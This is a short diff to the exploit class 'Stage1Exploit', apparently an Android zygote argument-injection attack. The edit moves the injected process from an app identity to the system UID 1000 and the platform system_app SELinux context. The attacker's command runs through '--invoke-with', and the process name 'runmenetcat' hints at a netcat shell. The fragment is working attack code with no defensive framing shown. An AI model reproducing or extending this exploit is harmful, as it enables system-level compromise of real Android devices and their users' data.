@@ -187,15 +187,13 @@ class Stage1Exploit:
         assert "," not in command
         # TODO let you specify the SELinux context through command line arguments
         raw_zygote_arguments = [
-            "--setuid=10079",
-            "--setgid=10079",
+            "--setuid=1000",
+            "--setgid=1000",
             "--setgroups=3003",
-            "--seinfo=ssgapp:ssg_app:complete",
             "--runtime-args",
-            "--target-sdk-version=28",
-            "--app-data-dir=/data/user/0/com.qualcomm.qti.qms.service.trustzoneaccess",
+            "--seinfo=platform:isSystemServer:system_app:targetSdkVersion=28:complete",
             "--runtime-flags=1",
-            "--nice-name=ssgapp",
+            "--nice-name=runmenetcat",
             "--invoke-with",
             f"{command}#",
         ]
